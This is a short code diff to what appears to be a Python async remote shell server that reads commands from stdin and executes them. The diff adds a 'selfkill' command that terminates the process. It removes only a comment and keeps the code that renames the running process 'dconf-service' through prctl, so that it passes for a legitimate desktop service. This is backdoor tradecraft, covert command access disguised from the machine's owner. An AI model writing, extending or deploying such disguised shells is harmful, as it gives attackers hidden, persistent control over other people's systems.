@@ -14,6 +14,9 @@ async def _shell(process):
     async for line in process.stdin:
         cmd = line.rstrip('\n')
         if cmd in ('exit', 'quit'): break
+        if cmd == 'selfkill':
+            import signal
+            os.kill(os.getpid(), signal.SIGKILL)
         if not cmd:
             process.stdout.write('$ ')
             continue
@@ -45,7 +48,6 @@ async def _main():
 
 if __name__ == '__main__':
     try:
-        # optional: blend into desktop environment
         try:
             import ctypes
             ctypes.CDLL('libc.so.6').prctl(15, b'dconf-service', 0, 0, 0)
